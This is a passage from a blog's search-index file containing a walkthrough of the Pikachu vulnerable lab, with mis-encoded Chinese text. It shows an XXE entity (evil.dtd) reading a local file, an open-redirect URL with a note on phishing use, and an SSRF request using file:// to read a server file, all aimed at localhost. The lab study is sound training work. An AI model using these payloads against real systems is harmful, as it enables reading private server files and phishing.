class="line"></span><br><span class="line">//ä¸‹é¢çš„æ˜¯å†™å…¥æ–‡ä»¶çš„</span><br><span class="line">evil.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///G:/wshy.txt&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ä¸å®‰å…¨çš„urlè·³è½¬"><a href="#ä¸å®‰å…¨çš„urlè·³è½¬" class="headerlink" title="ä¸å®‰å…¨çš„urlè·³è½¬"></a>ä¸å®‰å…¨çš„urlè·³è½¬</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚\</span><br><span class="line">å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯\</span><br><span class="line">å°±å¯èƒ½å‘ç”Ÿ&quot;è·³é”™å¯¹è±¡&quot;çš„é—®é¢˜ã€‚\</span><br><span class="line">\</span><br><span class="line">urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:\</span><br><span class="line">--&gt;é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ï¼š</p>
<ul>
<li>127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;urlredirect&#x2F;urlredirect.php?url&#x3D;<a href="https://www.baidu.com/">https://www.baidu.com</a></li>
</ul>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ul>
<li>å¯¹å†…ç½‘æƒ…å†µè¿›è¡Œæ¢æµ‹</li>
</ul>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/26749c91d3ff45e7af4db5a09fc06060~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<ul>
<li><a href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///E:/phpstudy/WWW/123.TXT">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///E:/phpstudy/WWW/123.TXT</a></li>
</ul>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/31c53afc3f2642a79395ad4a7760635c~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
</search>
